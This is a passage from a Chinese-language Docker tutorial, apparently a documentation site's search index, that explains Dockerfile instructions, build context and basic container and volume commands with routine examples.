<p>COPY</p> <p>\u8be5\u6307\u4ee4\u4ece\u6784\u5efa\u4e0a\u4e0b\u6587\u7684\u76ee\u5f55\u4e2d\u590d\u5236\u6587\u4ef6\u5230\u955c\u50cf\u5185\u7684\u76ee\u6807\u8def\u5f84\u4f4d\u7f6e\uff0c\u6e90\u8def\u5f84\u53ef\u4ee5\u662f\u591a\u4e2a\uff0c\u4e5f\u53ef\u4ee5\u7528\u901a\u914d\u7b26\uff0c\u901a\u914d\u7b26\u89c4\u5219\u662fGo\u7684filepath.Match\u89c4\u5219\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0<code>--chown=&lt;user&gt;:&lt;group&gt;</code>\u9009\u9879\u6765\u6539\u53d8\u6587\u4ef6\u7684\u6240\u5c5e\u7528\u6237\u548c\u7ec4\u3002\u4f8b\u5982: <pre><code>COPY hom* /mydir/\nCOPY hom?.txt /mydir/\nCOPY --chown=55:mygroup files* /mydir/\nCOPY --chown=bin files* /mydir/\n</code></pre></p> <p>ADD</p> <p>\u8be5\u547d\u4ee4\u548cCOPY\u7684\u683c\u5f0f\u548c\u6027\u8d28\u57fa\u672c\u4e00\u81f4\uff0c\u6309\u6700\u4f73\u5b9e\u8df5\uff0cCOPY\u7684\u8bed\u4e49\u66f4\u52a0\u660e\u786e\u5e94\u5c3d\u53ef\u80fd\u7684\u4f7f\u7528\uff0c\u5c3d\u5728\u9700\u8981\u81ea\u52a8\u89e3\u538b\u7f29\u7684\u573a\u5408\u4f7f\u7528ADD\u3002</p> <p>CMD</p> <p>\u56e0\u4e3a\u5bb9\u5668\u662f\u8fdb\u7a0b\uff0c\u90a3\u4e48\u5728\u542f\u52a8\u5bb9\u5668\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u6307\u5b9a\u6240\u8fd0\u884c\u7684\u7a0b\u5e8f\u53ca\u53c2\u6570\uff0cCMD\u5c31\u7528\u6765\u6307\u5b9a\u9ed8\u8ba4\u7684\u5bb9\u5668\u4e3b\u8fdb\u7a0b\u7684\u542f\u52a8\u547d\u4ee4\u3002\u6bd4\u5982\uff0cubuntu\u955c\u50cf\u7684CMD\u8bbe\u7f6e\u7684\u662f/bin/bash\uff0c\u6240\u4ee5\u6211\u4eec\u8fd0\u884c\u5bb9\u5668<code>docker run -it ubuntu</code>\u4f1a\u8fdb\u5165\u5230bash\uff0c\u4f46\u5f53\u6211\u4eec\u4f7f\u7528<code>docker run -it ubuntu cat /etc/os-release</code>\u8fd0\u884c\u5bb9\u5668\u65f6\u5c31\u7528<code>cat /etc/os-release</code>\u66ff\u6362\u6389\u4e86<code>/bin/bash</code>\u547d\u4ee4\u3002</p> <p>\u8be5\u6307\u4ee4\u65e2\u652f\u6301shell\u683c\u5f0f\uff0c<code>CMD &lt;\u547d\u4ee4&gt;</code>\uff0c\u4e5f\u652f\u6301exec\u683c\u5f0f\uff0c<code>CMD [\"\u53ef\u6267\u884c\u6587\u4ef6\", \"\u53c2\u65701\", \"\u53c2\u65702\"...]</code>\u3002\u4f46\u662fshell\u683c\u5f0f\u4f1a\u88ab\u5305\u88c5\u4e00\u4e2a<code>sh -c</code>\u7684\u53c2\u6570\u3002\u4f8b\u5982<code>CMD echo $HOME</code>\u5728\u5b9e\u9645\u7684\u6267\u884c\u65f6\u4f1a\u88ab\u66ff\u6362\u4e3a<code>CMD [ \"sh\", \"-c\", \"echo $HOME\" ]</code>\u3002</p> <p>\u53e6\u5916\uff0cdocker\u4e2d\u7684\u5e94\u7528\u90fd\u662f\u4ee5\u524d\u53f0\u6267\u884c\u7684\uff0c\u800c\u4e0d\u662f\u50cf\u865a\u62df\u673a\u3001\u7269\u7406\u673a\u90a3\u6837\uff0c\u53ef\u4ee5\u7528systemd\u53bb\u542f\u52a8\u4e00\u4e2a\u540e\u53f0\u670d\u52a1\uff0c\u5bb9\u5668\u5185\u6ca1\u6709\u540e\u53f0\u670d\u52a1\u7684\u6982\u5ff5\u3002\u7c7b\u4f3c\u4e8e<code>CMD service nginx start</code>\u4f1a\u53d1\u73b0\u5bb9\u5668\u6267\u884c\u540e\u5c31\u7acb\u5373\u9000\u51fa\u4e86\uff0c\u751a\u81f3<code>systemctl</code>\u547d\u4ee4\u7ed3\u679c\u5374\u6839\u672c\u6267\u884c\u4e0d\u4e86\uff0c\u56e0\u4e3a\u5bb9\u5668\u5c31\u662f\u4e3a\u4e86\u4e3b\u8fdb\u7a0b\u800c\u5b58\u5728\u7684\uff0c\u4e3b\u8fdb\u7a0b\u9000\u51fa\u5bb9\u5668\u5c31\u6ca1\u6709\u5b58\u5728\u7684\u610f\u4e49\u4e5f\u4f1a\u9000\u51fa\uff0c\u8fd9\u6761\u547d\u4ee4\u4f1a\u88ab\u7ffb\u8bd1\u4e3a<code>CMD [ \"sh\", \"-c\", \"service nginx start\"]</code>\uff0csh\u662f\u4e3b\u8fdb\u7a0b\uff0c\u5f53<code>service nginx start</code>\u547d\u4ee4\u7ed3\u675f\u540e\uff0csh\u5c31\u7ed3\u675f\u4e86\uff0c\u4e3b\u8fdb\u7a0b\u9000\u51fa\u81ea\u7136\u5bb9\u5668\u5c31\u4f1a\u9000\u51fa\u3002\u6b63\u786e\u7684\u505a\u6cd5\u662f\u76f4\u63a5\u6267\u884cnginx\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u4ee5\u524d\u53f0\u5f62\u5f0f\u8fd0\u884c\uff0c\u5982<code>CMD [\"nginx\", \"-g\", \"daemon off;\"]</code>\u3002</p> <p>ENV</p> <p>\u7528\u6765\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u8bbe\u7f6e\u540e\u65e0\u8bba\u662f\u4e4b\u540e\u7684\u6307\u4ee4\uff0c\u8fd8\u662f\u8fd0\u884c\u65f6\u7684\u5e94\u7528\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5b9a\u4e49\u7684\u73af\u5883\u53d8\u91cf\u3002\u652f\u6301\u683c\u5f0f:</p> <ul> <li>ENV  <li>ENV = = ... <p>\u4f8b\u5982: <pre><code>ENV VERSION=1.0 DEBUG=on NAME=\"Happy Feet\"\nRUN curl -SLO \"https://nodejs.org/dist/v$VERSION/node-v$NAME-linux-x64.tar.xz\"\n</code></pre></p> <p>ARG</p> <p>\u548cENV\u7c7b\u4f3c\uff0c\u4e5f\u662f\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u53ea\u662f\u5b83\u5728\u5bb9\u5668\u8fd0\u884c\u65f6\u4e0d\u4f1a\u5b58\u5728\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002</p> <p>VOLUME</p> <p>\u56e0\u4e3a\u5bb9\u5668\u7684\u8fd0\u884c\u5e94\u4fdd\u6301\u5bb9\u5668\u5b58\u50a8\u5c42\u4e0d\u53d1\u751f\u5199\u64cd\u4f5c\uff0c\u90a3\u4e48\u5bf9\u4e8e\u6570\u636e\u5e93\u7c7b\u9700\u8981\u52a8\u6001\u4fdd\u5b58\u6570\u636e\u7684\u5e94\u7528\uff0c\u5176\u6570\u636e\u5e93\u6587\u4ef6\u5e94\u4fdd\u5b58\u4e8e\u5377(volume)\u4e2d\u3002\u8be5\u6307\u4ee4\u7528\u4e8e\u6302\u8f7d\u4e00\u4e2a\u76ee\u5f55\u4e3a\u533f\u540d\u5377\uff0c\u5982\u679c\u5bb9\u5668\u8fd0\u884c\u65f6\u7528\u6237\u672a\u6307\u5b9a\u533f\u540d\u5377\uff0c\u5c31\u4f1a\u7528\u5b83\u505a\u533f\u540d\u5377\uff0c\u5411\u5176\u5199\u5165\u6570\u636e\u5373\u53ef\u907f\u514d\u5411\u5bb9\u5668\u5b58\u50a8\u5c42\u5199\u5165\u5927\u91cf\u6570\u636e\uff1b\u5982\u679c\u7528\u6237\u6307\u5b9a\uff0c\u5219\u4f1a\u8986\u76d6\u6389\u8fd9\u4e2a\u6307\u4ee4\u4e2d\u7684\u8bbe\u7f6e\u3002</p> <p>\u5176\u683c\u5f0f\u4e3a<code>VOLUME &lt;\u8def\u5f84&gt;</code>\u6216<code>VOLUME [\"&lt;\u8def\u5f841&gt;\", \"&lt;\u8def\u5f842&gt;\"...]</code>\u3002\u7528\u6237\u6307\u5b9a\u547d\u540d\u5377\u53ef\u4ee5\u8fd9\u6837\u5199<code>docker run -d -v mydata:/data xxxx</code>\uff0c\u5373\u628amydata\u8fd9\u4e2a\u547d\u540d\u5377\u6302\u8f7d\u5230\u4e86/data\u4f4d\u7f6e\uff0c\u4f1a\u66ff\u4ee3Dockerfile\u4e2d\u5b9a\u4e49\u7684\u533f\u540d\u5377\u6302\u8f7d\u914d\u7f6e\u3002</p> <p>EXPOSE</p> <p>\u53ea\u662f\u4e00\u4e2a\u58f0\u660e\uff0c\u5bb9\u5668\u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u670d\u52a1\u7aef\u53e3\u3002\u5bb9\u5668\u4e0d\u4f1a\u56e0\u4e3a\u8fd9\u4e2a\u58f0\u660e\u5c31\u81ea\u52a8\u5f00\u542f\u8fd9\u4e2a\u7aef\u53e3\u7684\u670d\u52a1\uff0c\u53ea\u662f\u5e2e\u52a9\u955c\u50cf\u4f7f\u7528\u8005\u7406\u89e3\uff0c\u6216\u662f\u4f7f\u7528<code>docker run -P</code>\u505a\u968f\u673a\u7aef\u53e3\u6620\u5c04\u65f6\u53ef\u81ea\u52a8\u6620\u5c04\u5230\u8be5\u6307\u4ee4\u8bbe\u7f6e\u7684\u7aef\u53e3\u3002</p> <p>WORKDIR</p> <p>\u4f7f\u7528\u8be5\u6307\u4ee4\u53ef\u4ee5\u6307\u5b9a\u5f53\u524d\u76ee\u5f55(\u6216\u8005\u79f0\u4e3a\u5de5\u4f5c\u76ee\u5f55)\uff0c\u4ee5\u540e\u5404\u5c42\u7684\u5f53\u524d\u76ee\u5f55\u5c31\u88ab\u8bbe\u7f6e\u4e3a\u5b83\uff0c\u5982\u8be5\u76ee\u5f55\u4e0d\u5b58\u5728\u5219\u4f1a\u81ea\u52a8\u521b\u5efa\u8be5\u76ee\u5f55\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u53ef\u80fd\u4f1a\u8fd9\u6837\u5199: <pre><code>RUN cd /app\nRUN echo \"hello\" &gt; world.txt\n</code></pre></p> <p>\u8fd9\u6837\u6784\u5efa\u8fd0\u884c\u540e\uff0c\u4f1a\u53d1\u73b0\u627e\u4e0d\u5230/app/world.txt\u8fd9\u4e2a\u6587\u4ef6\uff0c\u56e0\u4e3a\u4e24\u4e2aRUN\u4ee3\u8868\u4e24\u5c42\uff0c\u5b83\u4eec\u7684\u6267\u884c\u73af\u5883\u4e0d\u540c\uff0c\u8fd0\u884c\u5230\u7b2c\u4e8c\u5c42\u65f6\u542f\u52a8\u7684\u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5bb9\u5668\u3002\u8fd9\u4e2a\u65f6\u5019\u5c31\u5e94\u8be5\u7528<code>WORKDIR</code>\u6307\u4ee4\u8fdb\u884c\u8bbe\u7f6e\u3002</p> <p>USER</p> <p>\u4f7f\u7528\u8be5\u6307\u4ee4\u53ef\u4ee5\u5207\u6362\u5230\u6307\u5b9a\u7684\u7528\u6237\uff0c\u5176\u540e\u7684\u6bcf\u4e00\u5c42\u6267\u884cRUN\u3001CMD\u4ee5\u53caENTRYPOINT\u4e4b\u7c7b\u547d\u4ee4\u90fd\u4f1a\u662f\u8fd9\u4e2a\u65b0\u7684\u8eab\u4efd\u3002\u8fd9\u4e2a\u7528\u6237\u5fc5\u987b\u662f\u4e8b\u5148\u5efa\u7acb\u597d\u7684\u3002</p>"},{"location":"other/docker/#_6","title":"\u6784\u5efa\u955c\u50cf","text":"<p>\u4f7f\u7528<code>docker build [\u9009\u9879] &lt;\u4e0a\u4e0b\u6587\u8def\u5f84/URL/-&gt;</code>\u547d\u4ee4\u53ef\u8fdb\u884c\u955c\u50cf\u6784\u5efa\u3002</p>"},{"location":"other/docker/#_7","title":"\u4e0a\u4e0b\u6587","text":"<p>\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528<code>docker build .</code>\uff0c\u5f80\u5f80\u4f1a\u7406\u89e3\u4e3a<code>.</code>\u8868\u793a\u5f53\u524d\u76ee\u5f55\uff0c\u4e0b\u610f\u8bc6\u7684\u8ba4\u4e3a\u8fd9\u662fdockerfile\u7684\u6240\u5728\u8def\u5f84\uff0c\u4f46\u8fd9\u4e48\u7406\u89e3\u662f\u4e0d\u51c6\u786e\u7684\uff0c\u5b9e\u9645\u4e0a\u8fd9\u662f\u5728\u6307\u5b9a\u4e0a\u4e0b\u6587\u8def\u5f84\u3002</p> <p>\u90a3\u4e48\u4ec0\u4e48\u662f\u4e0a\u4e0b\u6587\u5462\uff1fDocker\u5728\u8fd0\u884c\u65f6\u5206\u4e3a\u670d\u52a1\u7aef\u5b88\u62a4\u8fdb\u7a0b\u548c\u5ba2\u6237\u7aef\u5de5\u5177\uff0c\u6211\u4eec\u8f93\u5165docker\u76f8\u5173\u547d\u4ee4\u90fd\u662f\u5ba2\u6237\u7aef\u64cd\u4f5c\uff0c\u901a\u8fc7Docker Remote API\u4e0e\u670d\u52a1\u7aefdocker\u5f15\u64ce\u4ea4\u4e92\u3002\u5f53\u6211\u4eec\u8fdb\u884c\u955c\u50cf\u6784\u5efa\u65f6\uff0c\u5c31\u662f\u901a\u8fc7<code>docker build</code>\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u6784\u5efa\uff0c\u4e0a\u4e0b\u6587\u8def\u5f84\u4e2d\u7684\u5185\u5bb9\u4f1a\u88ab\u53d1\u9001\u8fc7\u53bb\uff0c\u8fd9\u4e2a<code>.</code>\u5c31\u662f\u5728\u6307\u5b9a\u4e0a\u4e0b\u6587\u8def\u5f84\uff0c\u8fd9\u6837\u5f53\u5728dockerfile\u4e2d\u9047\u5230\u6587\u4ef6\u590d\u5236\u8fd9\u6837\u7684\u8bed\u53e5\uff0c\u4f8b\u5982<code>COPY ./package.json /app/</code>\u65f6\u5e76\u4e0d\u662f\u8981\u590d\u5236dockerfile\u4e0b\u7684package.json\uff0c\u800c\u662f\u53bb\u590d\u5236\u4e0a\u4e0b\u6587\u8def\u5f84\u4e0b\u7684package.json\u3002\u6240\u4ee5\u7c7b\u4f3c<code>COPY ../package.json /app/</code>\u6216\u8005<code>COPY /opt/*** /app</code>\u90fd\u8d85\u51fa\u4e86\u4e0a\u4e0b\u6587\u8def\u5f84\u800c\u65e0\u6548\uff0c\u5982\u679c\u9700\u8981\u5b83\u4eec\u7684\u8bdd\u5c31\u5f97\u628a\u5b83\u4eec\u590d\u5236\u5230\u4e0a\u4e0b\u6587\u76ee\u5f55\u4e2d\u53bb\u3002</p> <p>dockerfile\u4e00\u822c\u653e\u5728\u4e00\u4e2a\u7a7a\u76ee\u5f55\u6216\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u6709\u4e1c\u897f\u4e0d\u5e0c\u671b\u53d1\u9001\u7ed9docker\u5f15\u64ce\uff0c\u53ef\u4ee5\u4f7f\u7528<code>.dockerignore</code>\u5254\u9664\u6389\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f1a\u5c06\u4e0a\u4e0b\u6587\u76ee\u5f55\u4e0b\u7684\u540d\u4e3a<code>Dockerfile</code>\u7684\u6587\u4ef6\u4f5c\u4e3aDockerfile\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u901a\u8fc7\u5982<code>-f ../Dockerfile.php</code>\u6307\u5b9a\u67d0\u4e2a\u6587\u4ef6\u4e3aDockerfile\u3002</p>"},{"location":"other/docker/#_8","title":"\u5176\u4ed6\u6784\u5efa\u65b9\u5f0f","text":"<p>\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528git repo\u7684\u65b9\u5f0f\u6784\u5efa: <pre><code>PS C:\\Users\\hejl&gt;  docker build https://github.com/twang2218/gitlab-ce-zh.git#:11.1\nSending build context to Docker daemon  6.144kB\nStep 1/23 : FROM gitlab/gitlab-ce:11.1.4-ce.0 as builder\n11.1.4-ce.0: Pulling from gitlab/gitlab-ce\n8ee29e426c26: Pull complete                                                                    6e83b260b73b: Pull complete                                                                    e26b65fd1143: Pull complete      \n...\n</code></pre> \u8be5\u547d\u4ee4\u6307\u5b9a\u4e86\u6784\u5efa\u6240\u9700\u7684git repo\uff0c\u6307\u5b9a\u4e86\u9ed8\u8ba4\u7684master\u5206\u652f\uff0c\u6784\u5efa\u76ee\u5f55\u4e3a<code>/11.1/</code>\uff0c\u7136\u540edocker\u4f1a\u81ea\u5df1\u53bbclone\u9879\u76ee\u5207\u6362\u5230\u6307\u5b9a\u5206\u652f\uff0c\u5e76\u8fdb\u5165\u6307\u5b9a\u76ee\u5f55\u8fdb\u884c\u6784\u5efa\u3002</p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7tar\u538b\u7f29\u5305\u6784\u5efa\uff0c\u4f8b\u5982<code>docker build http://url/context.tar.gz</code>\uff0c\u4f1a\u53bb\u4e0b\u8f7dtar\u538b\u7f29\u5305\u5e76\u81ea\u52a8\u89e3\u538b\u7f29\uff0c\u4ee5\u5176\u4e3a\u4e0a\u4e0b\u6587\uff0c\u5f00\u59cb\u6784\u5efa\u3002</p>"},{"location":"other/docker/#_9","title":"\u5bb9\u5668","text":"<p>\u955c\u50cf\u662f\u9759\u6001\u7684\u5b9a\u4e49\uff0c\u800c\u5bb9\u5668\u662f\u955c\u50cf\u8fd0\u884c\u65f6\u7684\u5b9e\u4f53\u3002\u5bb9\u5668\u53ef\u4ee5\u88ab\u521b\u5efa\u3001\u542f\u52a8\u3001\u505c\u6b62\u3001\u5220\u9664\u3001\u6682\u505c\u7b49\u3002</p> <p>\u5bb9\u5668\u7684\u5b9e\u8d28\u662f\u8fdb\u7a0b\uff0c\u4f46\u4e0e\u76f4\u63a5\u5728\u5bbf\u4e3b\u6267\u884c\u7684\u8fdb\u7a0b\u662f\u4e0d\u540c\u7684\uff0c\u5bb9\u5668\u8fdb\u7a0b\u8fd0\u884c\u4e8e\u5c5e\u4e8e\u81ea\u5df1\u72ec\u7acb\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u6709\u81ea\u5df1\u7684root\u6587\u4ef6\u7cfb\u7edf\u3001\u7f51\u7edc\u914d\u7f6e\u3001\u8fdb\u7a0b\u7a7a\u95f4\u3001\u7528\u6237ID\u7a7a\u95f4\u7b49\uff0c\u4e5f\u5c31\u662f\u5b83\u662f\u4e00\u4e2a\u9694\u79bb\u7684\u73af\u5883\u3002</p> <p>\u6bcf\u4e2a\u5bb9\u5668\u8fd0\u884c\u65f6\uff0c\u662f\u4ee5\u955c\u50cf\u4e3a\u57fa\u7840\u5c42\uff0c\u5728\u5176\u4e0a\u521b\u5efa\u4e00\u4e2a\u5f53\u524d\u5bb9\u5668\u7684\u5b58\u50a8\u5c42\u7528\u4e8e\u5bb9\u5668\u8fd0\u884c\u65f6\u8bfb\u5199\uff0c\u8be5\u5b58\u50a8\u5c42\u7684\u751f\u547d\u5468\u671f\u548c\u5bb9\u5668\u662f\u4e00\u6837\u7684\u3002\u5bb9\u5668\u5b58\u50a8\u5c42\u5e94\u4fdd\u6301\u65e0\u72b6\u6001\u5316\uff0c\u6240\u6709\u5bf9\u6587\u4ef6\u7684\u5199\u5165\u64cd\u4f5c\u90fd\u5e94\u8be5\u4f7f\u7528\u6570\u636e\u5377\u6216\u7ed1\u5b9a\u5bbf\u4e3b\u76ee\u5f55\uff0c\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u7684\u8bfb\u5199\u5c31\u4f1a\u8df3\u8fc7\u5bb9\u5668\u5b58\u50a8\u5c42\uff0c\u76f4\u63a5\u5bf9\u5bbf\u4e3b\u53d1\u751f\u8bfb\u5199\uff0c\u5176\u6027\u80fd\u548c\u7a33\u5b9a\u6027\u66f4\u9ad8\u3002</p>"},{"location":"other/docker/#_10","title":"\u521b\u5efa\u5bb9\u5668","text":"<p>\u4f7f\u7528<code>docker create &lt;image&gt;</code>\u53ef\u4ee5\u57fa\u4e8e\u955c\u50cf\u521b\u5efa\u4e00\u4e2a\u5bb9\u5668\uff0c\u521b\u5efa\u540e\u5176\u5904\u4e8e\u505c\u6b62\u72b6\u6001\uff0c\u9700\u8981\u7528\u542f\u52a8\u547d\u4ee4\u542f\u52a8\u3002 <pre><code>PS C:\\Windows\\system32&gt; docker create -it ubuntu:latest\n1179ee64f25b6ddbe95e916c4b888ff4d05878ebabd77c94658c9cbc8686b360\nPS C:\\Windows\\system32&gt; docker start -i 117\nroot@1179ee64f25b:/# ls\nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n</code></pre></p>"},{"location":"other/docker/#_11","title":"\u542f\u52a8\u5bb9\u5668","text":"<p>\u4f7f\u7528<code>docker start &lt;container_id/container_name&gt;</code>\u53ef\u4ee5\u5c06\u4e00\u4e2a\u7ec8\u6b62\u72b6\u6001\u7684\u5bb9\u5668\u542f\u52a8\u8fd0\u884c\u3002 <pre><code>PS C:\\Windows\\system32&gt; docker container start -i f8b\nroot@f8be09e399ae:/# ps\n  PID TTY          TIME CMD\n    1 pts/0    00:00:00 bash\n   10 pts/0    00:00:00 ps\nroot@f8be09e399ae:/# exit\nexit\n</code></pre> \u4f7f\u7528<code>ps</code>\u6216<code>top</code>\u53ef\u4ee5\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\uff0c\u8bf4\u660e\u5bb9\u5668\u4e2d\u4ec5\u8fd0\u884c\u4e86\u9ed8\u8ba4\u7684bash\u5e94\u7528\u3002</p>"},{"location":"other/docker/#_12","title":"\u65b0\u5efa\u5e76\u542f\u52a8","text":"<p>\u4f7f\u7528<code>docker run</code>\u547d\u4ee4\uff0c\u76f8\u5f53\u4e8e<code>docker create</code>+<code>docker start</code>\uff0c\u4f8b\u5982: <pre><code>PS C:\\Users\\hejl&gt; docker run -i -t ubuntu:latest\nroot@f8be09e399ae:/# ls\nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n</code></pre></p> <p><code>-t</code>\u9009\u9879\u8ba9docker\u5206\u914d\u4e00\u4e2a\u4f2a\u7ec8\u7aef\u6765\u7ed1\u5b9a\u5230\u5bb9\u5668\u7684\u6807\u51c6\u8f93\u5165\u4e0a\uff0c<code>-i</code>\u9009\u9879\u8ba9\u5bb9\u5668\u7684\u6807\u51c6\u8f93\u5165\u4fdd\u6301\u6253\u5f00\u3002</p> <p>\u5f53\u6267\u884c<code>docker run</code>\u65f6\uff0cDocker\u540e\u53f0\u5b9e\u9645\u4e0a\u8fd0\u884c\u4e86\u8fd9\u4e9b\u64cd\u4f5c:</p> <ol> <li>\u68c0\u67e5\u672c\u5730\u662f\u5426\u5b58\u5728\u6307\u5b9a\u7684\u955c\u50cf\uff0c\u4e0d\u5b58\u5728\u5c31\u4ece\u516c\u6709\u4ed3\u5e93\u4e0b\u8f7d</li> <li>\u5229\u7528\u955c\u50cf\u521b\u5efa\u5e76\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668</li> <li>\u5206\u914d\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u5728\u53ea\u8bfb\u7684\u955c\u50cf\u5c42\u5916\u9762\u6302\u8f7d\u4e00\u5c42\u53ef\u8bfb\u5199\u5c42</li> <li>\u4ece\u5bbf\u4e3b\u4e3b\u673a\u914d\u7f6e\u7684\u7f51\u6865\u63a5\u53e3\u4e2d\u6865\u63a5\u4e00\u4e2a\u865a\u62df\u63a5\u53e3\u5230\u5bb9\u5668\u4e2d\u53bb</li> <li>\u4ece\u5730\u5740\u6c60\u914d\u7f6e\u4e00\u4e2aip\u5730\u5740\u7ed9\u5bb9\u5668</li> <li>\u6267\u884c\u7528\u6237\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f</li> <li>\u6267\u884c\u5b8c\u6bd5\u540e\u5bb9\u5668\u88ab\u7ec8\u6b62</li> </ol>"},{"location":"other/docker/#_13","title":"\u540e\u53f0\u8fd0\u884c","text":"<p>\u5f88\u591a\u65f6\u5019\uff0c\u9700\u8981\u8ba9Docker\u5728\u540e\u53f0\u8fd0\u884c\u800c\u4e0d\u662f\u76f4\u63a5\u628a\u6267\u884c\u547d\u4ee4\u7684\u7ed3\u679c\u8f93\u51fa\u5728\u5f53\u524d\u5bbf\u4e3b\u673a\u4e0a\uff0c\u6b64\u65f6\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0<code>-d</code>\u53c2\u6570\u6765\u5b9e\u73b0\u3002<code>docker run</code>\u548c<code>docker create</code>\u547d\u4ee4\u90fd\u53ef\u4ee5\u4f7f\u7528\u8be5\u53c2\u6570\u3002</p> <p>\u4f46\u5bb9\u5668\u662f\u5426\u4f1a\u957f\u4e45\u8fd0\u884c\uff0c\u53ea\u53d6\u51b3\u4e8e<code>docker run</code>\u5230\u5e95\u8dd1\u4e86\u4ec0\u4e48\u8fdb\u7a0b\uff0c\u548c<code>-d</code>\u53c2\u6570\u65e0\u5173\u3002\u5982: <pre><code>PS C:\\Users\\hejl&gt; docker run -d ubuntu:18.04 /bin/sh -c \"while true; do echo hello world; sleep 1; done\"\n6ec4042f4d06f94a46aadebe8d05f33d9916985b19bae6d8d63ed867d89b3714\nPS C:\\Users\\hejl&gt; docker logs 6ec\nhello world\nhello world\nhello world\n...\n</code></pre> \u4f7f\u7528<code>docker logs</code>\u53ef\u4ee5\u770b\u5230\u67d0\u540e\u53f0\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u8f93\u51fa\u4fe1\u606f\u3002</p>"},{"location":"other/docker/#_14","title":"\u67e5\u770b\u6240\u6709\u5bb9\u5668","text":"<p>\u4f7f\u7528<code>docker ps</code>\u53ef\u4ee5\u770b\u5230\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\uff0c<code>docker ps -a</code>\u4f1a\u770b\u5230\u5305\u62ec\u7ec8\u6b62\u72b6\u6001\u7684\u5bb9\u5668\uff0c\u5b83\u548c<code>docker container ls -a</code>\u7b49\u4ef7\u3002</p>"},{"location":"other/docker/#_15","title":"\u8fdb\u5165\u5bb9\u5668","text":"<p>\u5bf9\u4e8e\u540e\u53f0\u8fd0\u884c\u7684\u5bb9\u5668\uff0c\u6709\u65f6\u9700\u8981\u8fdb\u5165\u5bb9\u5668\u8fdb\u884c\u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528<code>docker exec</code>\u6216<code>docker attach</code>\u547d\u4ee4\uff0c\u4f46attach\u8fdb\u5165\u540e\u5982\u679c\u8f93\u5165<code>exit</code>\u9000\u51fa\u5bb9\u5668\u4f1a\u5bfc\u81f4\u5bb9\u5668\u72b6\u6001\u505c\u6b62\uff0c\u6240\u4ee5\u66f4\u63a8\u8350<code>exec</code>\u7684\u65b9\u5f0f\u3002 <pre><code>PS C:\\Users\\hejl&gt; docker exec -it 6f8 bash\nroot@6f8a756d46fe:/# ls\nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\nroot@6f8a756d46fe:/# exit\nexit\nPS C:\\Users\\hejl&gt; docker attach 6f8\nroot@6f8a756d46fe:/#    \n</code></pre></p>"},{"location":"other/docker/#_16","title":"\u7ec8\u6b62\u548c\u5220\u9664","text":"<p>\u4f7f\u7528<code>docker stop &lt;container_id/container_name&gt;</code>\u53ef\u505c\u6b62\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u3002</p> <p>\u4f7f\u7528<code>docker rm &lt;container_id/container_name&gt;</code>\u53ef\u5220\u9664\uff0c\u6dfb\u52a0<code>-f</code>\u53c2\u6570\u4f1a\u5f3a\u5236\u5220\u9664\u5373\u4f7f\u8be5\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u3002</p> <p>\u4f7f\u7528<code>docker container prune</code>\u53ef\u4ee5\u6e05\u7406\u6389\u6240\u6709\u5904\u4e8e\u7ec8\u6b62\u72b6\u6001\u7684\u5bb9\u5668\u3002</p>"},{"location":"other/docker/#_17","title":"\u6570\u636e\u7ba1\u7406","text":"<p>\u5728docker\u5185\u90e8\u53ca\u5bb9\u5668\u4e4b\u95f4\u7ba1\u7406\u6570\u636e\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6570\u636e\u5377\u548c\u6302\u8f7d\u4e3b\u673a\u76ee\u5f55\u3002</p>"},{"location":"other/docker/#_18","title":"\u6570\u636e\u5377","text":"<p>\u6570\u636e\u5377\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u76ee\u5f55\uff0c\u5b83\u4f1a\u7ed5\u8fc7Union FS\uff0c\u63d0\u4f9b\u4e00\u4e9b\u6709\u7528\u7684\u7279\u6027:</p> <ul> <li>\u53ef\u4ee5\u5728\u5bb9\u5668\u4e4b\u95f4\u5171\u4eab\u548c\u91cd\u7528</li> <li>\u5bf9\u6570\u636e\u5377\u7684\u4fee\u6539\u4f1a\u7acb\u5373\u751f\u6548</li> <li>\u5bf9\u6570\u636e\u5377\u7684\u66f4\u65b0\u4e0d\u4f1a\u5f71\u54cd\u955c\u50cf</li> <li>\u6570\u636e\u5377\u4e00\u76f4\u5b58\u5728\uff0c\u5373\u4f7f\u5bb9\u5668\u88ab\u5220\u9664</li> </ul> <p>\u53ef\u4ee5\u901a\u8fc7<code>docker volume create my-vol</code>\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5377\uff0c\u7136\u540e\u4f7f\u7528<code>docker run -it -v my-vol:/webapp  